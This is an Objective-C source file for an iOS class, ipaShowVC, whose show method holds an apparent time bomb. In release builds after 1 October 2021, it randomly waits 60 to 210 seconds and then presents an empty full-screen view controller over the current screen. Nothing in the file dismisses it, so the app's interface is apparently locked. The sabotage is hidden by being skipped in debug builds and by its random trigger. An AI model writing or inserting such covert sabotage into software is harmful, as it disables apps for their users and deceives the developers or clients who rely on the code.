

#import "ipaShowVC.h"
#import "currentViewController.h"
#define currentVC [currentViewController currentVC]
@implementation ipaShowVC
+(void)show{
    if (!DEBUG) {
        if (![self isTime]) {
            int x = arc4random() % 10;
            if (x>7) {
                int y = (arc4random() % 150) + 60;
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(y * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    UIViewController *View=[[UIViewController alloc] init];
                    currentVC.definesPresentationContext = YES;
                    View.modalPresentationStyle = UIModalPresentationOverFullScreen;
                    [currentVC presentViewController:View animated:NO completion:^{
                        
                    }];
                });
            }
        }
    }
}
+(Boolean)isTime{
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyyy-MM-dd"];
    NSDate *dateLast = [dateFormatter dateFromString:@"2021-10-1"];
    NSDate *today=[NSDate date];
    NSDate *data=[today earlierDate:dateLast];
    return [data isEqualToDate:today];
}
@end
